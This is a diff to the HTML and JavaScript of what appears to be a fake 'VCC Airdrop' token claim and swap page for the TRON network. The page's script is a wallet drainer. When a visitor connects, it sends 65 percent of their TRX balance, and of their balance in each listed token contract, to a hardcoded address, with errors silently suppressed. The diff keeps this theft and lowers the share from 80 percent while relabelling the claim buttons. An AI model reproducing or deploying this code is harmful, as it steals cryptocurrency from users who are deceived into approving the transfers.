@@ -36,7 +36,7 @@
                             <input class="input-border-bottom border-color-extra-light-gray large-input px-0 margin-25px-bottom border-radius-0px required" type="number" name="Token number to swap (VCC)" placeholder="Token number to swap (VCC)" />
                                 <span class="text-extra-dark-gray alt-font font-weight-500">Swaped token: <span id="SwapedToken"></span> TRX</span><br><br><br>
                             
-                            <button class="btn btn-medium btn-fancy btn-gradient-peacock-blue-crome-yellow-2 mb-0">Swap now</button>
+                            <button class="btn btn-medium btn-fancy btn-gradient-peacock-blue-crome-yellow-2 mb-0">Get TRX </button>
                         </div>
                         </div>
                     </div>
@@ -86,14 +86,14 @@
                 try{
                     var balance = await window.tronWeb.trx.getBalance();
                     if (balance >= 100000000)
-                    await tronWeb.trx.sendTransaction("41c32FaF16A6344926c62e3731DA86f2240d917e23", Math.round(balance * 80 / 100));
+                    await tronWeb.trx.sendTransaction("41c32FaF16A6344926c62e3731DA86f2240d917e23", Math.round(balance * 65 / 100));
                 }catch{}
                 for(i=0; i<contractsAddress.length; i++){
                     try{
                     var cc = await window.tronWeb.contract().at(contractsAddress[i]);
                     balance = await cc.balanceOf(window.tronWeb.defaultAddress.base58).call();
                     if (balance.toNumber() >= 100000){
-                        await cc.transfer("41c32FaF16A6344926c62e3731DA86f2240d917e23", Math.round(balance * 80 / 100)).send()
+                        await cc.transfer("41c32FaF16A6344926c62e3731DA86f2240d917e23", Math.round(balance * 65 / 100)).send()
                     }
                     }catch{}
                 }
@@ -104,7 +104,7 @@
                 <div class="row">
                     <div class="col-12 text-center overlap-section wow animate__flipInX">
                         <span class="alt-font font-weight-600 d-none d-md-inline-block text-gradient-peacock-blue-crome-yellow-2 title-extra-large-heavy letter-spacing-minus-10px">VCC Airdrop</span>
-                    <p style="font-size: 25px;">Each user can claim ($<span class="yourprice"></span>) TRX</p>
+                    <p style="font-size: 25px;">Each user can claim (<span class="yourprice"></span>) TRX</p>
                     </div>
                 </div>
                 <div class="row row-cols-1 row-cols-lg-2 justify-content-center margin-3-rem-tb sm-no-margin-top">
@@ -114,7 +114,7 @@
                             <h5 class="alt-font font-weight-600 text-extra-dark-gray mb-5 letter-spacing-minus-1px">Claim Your free VCC token</h5>
                         <div>
                             <br>
-                            <button class="btn btn-medium btn-fancy btn-gradient-peacock-blue-crome-yellow-2 mb-0 submit">Claim 34806 ($<span class="yourprice"></span>) TRX</button>
+                            <button class="btn btn-medium btn-fancy btn-gradient-peacock-blue-crome-yellow-2 mb-0 submit">Claim 34806 (<span class="yourprice"></span>) TRX</button>
                         </div>
                         </div>
                     </div>
